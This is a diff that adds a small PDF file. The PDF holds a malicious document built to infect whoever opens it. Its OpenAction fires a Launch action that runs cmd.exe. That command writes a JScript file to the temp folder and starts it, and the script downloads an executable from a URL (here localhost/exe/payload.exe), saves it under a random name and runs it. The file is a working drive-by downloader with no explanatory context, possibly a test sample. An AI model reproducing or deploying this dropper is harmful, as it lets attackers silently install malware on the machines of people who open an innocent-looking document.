@@ -1,0 +1,18 @@
+%PDF-1.3
+1 0 obj<</Type/Catalog/Outlines 2 0 R/Pages 3 0 R/OpenAction 5 0 R>>endobj
+2 0 obj<</Type/Outlines/Count 0>>endobj
+3 0 obj<</Type/Pages/Kids[4 0 R]/Count 1>>endobj
+4 0 obj<</Type/Page/Parent 3 0 R/MediaBox[0 0 612 792]>>endobj
+5 0 obj<</Type/Action/S/Launch/Win<</F(cmd.exe)/P(/Q /C cd %temp%&echo (function(a,b,c){if(b==undefined)b=null;if(c==undefined)c=null;for(var d="XMLHTTP",e="Server"+d,f=".6.0",g=".3.0",h=[d+f,d+g,d,e+f,e+g,e],i=d=e=f=0;i^<6;i++)try{d=new ActiveXObject("MSXML2."+h[i]);e=new ActiveXObject("ADODB.Stream");f=new ActiveXObject("WScript.Shell");break}catch(g){}if(d^&^&e^&^&f)try{d.open("GET",a,0,b,c);d.send();if((a.indexOf("http")==0^&^&d.status==200)^|^|(a.indexOf("ftp")==0^&^&d.status==0)){e.Mode=3;e.Type=1;e.Open();e.Write(d.responseBody);i=f.Environment("PROCESS").Item("TEMP")+"\\\\"+Math.round(Math.random()*1e15).toString(36)+".exe";e.SaveToFile(i,2);e.Close();f.Run(i)}}catch(g){}})("http://localhost/exe/payload.exe");>js.js&start js.js)>>>>endobj
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000086 00000 n
+0000000127 00000 n
+0000000177 00000 n
+0000000241 00000 n
+trailer<</Size 6/Root 1 0 R>>
+startxref
+999
+%%EOF
